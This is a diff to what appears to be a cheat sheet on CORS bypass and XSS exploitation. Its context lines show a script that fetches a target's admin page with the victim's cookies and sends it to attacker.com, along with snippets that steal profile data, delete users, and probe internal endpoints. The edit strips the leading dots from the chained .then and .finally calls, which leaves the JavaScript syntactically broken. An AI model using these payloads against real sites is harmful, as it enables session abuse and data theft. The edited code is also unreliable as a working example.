@@ -33,8 +33,8 @@ Host: target.com
 # XSS + CORS Bypass
 <script>
   fetch('https://target.com/admin', {credentials: 'include'})
-    .then(r => r.text())
-    .then(d => location='https://attacker.com/?data='+btoa(d))
+    then(r => r.text())
+    then(d => location='https://attacker.com/?data='+btoa(d))
 </script>
 
 #### 4. COMMON MISCONFIGURATIONS
@@ -61,8 +61,8 @@ http://target.com (when HTTPS is whitelisted)
 #### 6. POST-EXPLOITATION
 # Steal Sensitive Data
 fetch('https://target.com/user/profile', {credentials: 'include'})
-  .then(response => response.json())
-  .then(data => exfiltrate(data))
+  then(response => response.json())
+  then(data => exfiltrate(data))
 
 # Perform Privileged Actions
 fetch('https://target.com/admin/deleteUser', {
@@ -76,7 +76,7 @@ fetch('https://target.com/admin/deleteUser', {
 <script>
   const start = performance.now()
   fetch('https://target.com/internal', {credentials: 'include'})
-    .finally(() => {
+    finally(() => {
       if (performance.now() - start > 1000) {
         alert('Possible internal endpoint')
       }
